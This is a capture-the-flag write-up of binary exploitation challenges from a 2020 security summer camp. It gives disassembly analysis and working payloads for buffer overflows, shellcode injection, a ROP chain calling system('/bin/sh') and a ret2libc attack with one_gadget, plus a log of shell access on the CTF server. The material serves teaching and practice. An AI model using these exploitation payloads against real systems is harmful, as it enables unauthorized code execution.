# CyberSec summercamp 2020 
## pwn-ctf

## Challenges

### 張元Pwn-6 (50 pts)

First find the magic in binary file , then solve 1000 math questions with loop

Switch to interactive to `cat flag`

### 張元Pwn-7 (50 pts)

This challenge requires a little bit Reversing basic

#### stage1
We can see a simple `if` statement in function `stage1()`, as shown below:
    
    0x0040077d      8b45f4         mov eax, dword [var_ch]
    0x00400780      83e001         and eax, 1
    0x00400783      85c0           test eax, eax
    0x00400785      7434           je 0x4007bb
    0x00400787      8b45f4         mov eax, dword [var_ch]
    0x0040078a      2500001000     and eax, 0x100000
    0x0040078f      85c0           test eax, eax
    0x00400791      7428           je 0x4007bb
    0x00400793      8b45f4         mov eax, dword [var_ch]
    0x00400796      2500020000     and eax, 0x200              
    0x0040079b      85c0           test eax, eax
    0x0040079d      751c           jne 0x4007bb

we can try changing it into a C-like `if` statement:

`if ((var_ch & 1) != 0 && ((var_ch & 0x100000) != 0 && (var_ch & 0x200) == 0))`

base on this, we can write a keygen to crack `var_ch` in stage1

#### stage2

We can see it's trying to get three numbers from user input:

    0x00400810      e80bfeffff     call sym.imp.__isoc99_scanf
    0x00400815      8b45ec         mov eax, dword [var_14h]
    0x00400818      83f864         cmp eax, 0x64               
    0x0040081b      7530           jne 0x40084d
    0x0040081d      8b45f0         mov eax, dword [var_10h]
    0x00400820      3d00010000     cmp eax, 0x100              
    0x00400825      7526           jne 0x40084d
    0x00400827      8b45f4         mov eax, dword [var_ch]
    0x0040082a      3d0cb0cefa     cmp eax, 0xfaceb00c
    0x0040082f      751c           jne 0x40084d

based on the disassembly, we get three integers, 0x64, 0x100 and 0xfaceb00c


#### stage3

Again, the binary is comparing user input with a global varible

we can get the value of the varible(0x60107c) in the binary

send the numbers, and we get a shell

    [+] Opening connection to 139.110.112.192 on port 2117: Done
    [*] Switching to interactive mode
    Stage 2 completed
    Congrat! Here is your shell!
    $ cat flag
    BreakAllCTF{A_g-01d_h4cker_15_f4m1liar_w1th_b1n4ry_5ystem}

### 張元Pwn-8(50 pts)

From the assembly, we can see a shell function at `0x4006b6`

simply overwrite the return address as `0x4006b6`, we get a shell

### Angelboy Pwn-1(50 pts)

Same as the previous challenge, but this time the stack size is `0x20`

### Angelboy Pwn-2(50 pts)

Same as the previous challenge, but we're going to jump to our own shellcode instead of the given shell funvtion

we can write the shellcode in the `Name` varible(because the shellcode made by `shellcraft()` is only 44 bytes)


then we can overwrite the return pointer to jump to our shellcode(at `Name`)

### 張元 Pwn-1(100 pts)

This is an varible overwrite challenge

we can see that the  binary is trying to compare some varible to `0xfaceb00c` and `0xdeadbeef`

simply overwrite these two numbers by sending a payload like this:

`'A' *12 + p32(0xfaceb00c) + p32(0xdeadbeef)`

then we see that the program is comparing our input with a random number 

we can adjust our payload, to overwrite the random number to a known integer

in my exploit, my  paylaod is :

`'A' * 12 + p32(0xfaceb00c) + p32(0xdeadbeef) + p32(0x12345678)`

now we know the password(0x12345678), then we can pass it easily and get a shell

### 張元 Pwn-9(100 pts)

This challenge is similar to `Angelboy Pwn-2`, but the stack location is randomized

but the binary still gives us the `RSP`:

`Your address of input buffer is 0x7fff38a14c30`

now we get the RSP, we can try making a payload like this:

`asm(shellcraft.sh()) + 'A' * (0x70 + 8 - len(asm(shellcraft.sh()))) + p64(rsp)`

send the payload, and we get a shell

### 張元 Pwn-10(100 pts)

This is a simple ROP challenge

we can first put string `/bin/sh` in the first varible

then, we try to craft a payload to bypass NX

our payload will be like :

`(some padding) + (pop rdi) + "/bin/sh" address + system() address`

from the disassembly, we know that this binary contains `system()` function:

`0x004006bf      e86cfeffff     call sym.imp.system`

before we can call `system()`, we have to clean the `RDI` register

let's find some gadget using `ROPgadget`

`0x0000000000400773 : pop rdi ; ret`

our final payload looks like this:

`'A' * (48 + 8) + p64(0x0000000000400773) + p64(0x601070) + p64(0x004006bf)`

### Angelboy Pwn-3(100 pts)

This is a classic `return to libc` challenge

we're going to use a great tool called `one_gadget`, this way we won't have to craft a complicated payload by ourselves

our payload will be like:

`(some padding) + (the address that one_gadget give us)`

first, there is a memory leaking function in this program:

`Give me an address (in hex) :`

we can give the program the `got` address of `puts`

then it'll return a address, which is the address of `puts` in libc

we can get the target libc base address by doing `puts_addr - offset`

let's find the offset first(with readelf):

`404: 000000000006f690   456 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5`

then use `one_gadget` to find the address to jump:

 `0x45216 execve("/bin/sh", rsp+0x30, environ)`


now we get the address, let's craft our payload:

`'A'* (0x110 + 8) + p64((libc_base + 0x45216)) ` 


### other

TBD
